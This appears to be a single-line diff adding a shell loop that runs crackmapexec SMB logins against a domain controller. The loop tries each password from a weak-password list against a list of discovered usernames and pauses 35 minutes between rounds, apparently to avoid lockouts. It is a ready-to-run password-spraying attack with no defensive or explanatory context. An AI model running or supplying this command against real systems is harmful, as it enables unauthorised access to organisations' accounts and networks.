@@ -1,0 +1,1 @@
+for i in $(cat lists/weak_passwords.txt); do crackmapexec smb "dc_ip" -u discovered-usernames.txt -p $i; echo $i; sleep 35m; done 
